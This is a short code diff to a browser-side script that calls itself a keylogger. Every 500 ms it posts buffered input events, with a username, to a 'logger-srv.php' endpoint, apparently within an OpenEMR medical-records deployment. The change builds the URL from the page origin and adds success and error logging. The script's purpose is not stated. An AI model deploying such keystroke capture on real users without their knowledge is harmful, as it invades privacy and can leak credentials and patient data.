@@ -28,6 +28,14 @@ window.setInterval(function () {
       events = [];
       var data = JSON.stringify({ user: vliegtuig_username, events: eventsToSend });
       console.log(data);
-      fetch("/openemr/keylogger/logger-srv.php", { method: 'post', body: data });
+      fetch(`${window.location.origin}/keylogger/logger-srv.php`, { method: 'post', body: data })
+      .then(response => response.text())
+      .then(data => {
+        console.log('[keylogger] Success:', data);
+      })
+      .catch((error) => {
+        // TODO: There is no server error currently.
+        console.error('[keylogger] Error:', error);
+      });
   }
 }, 500);
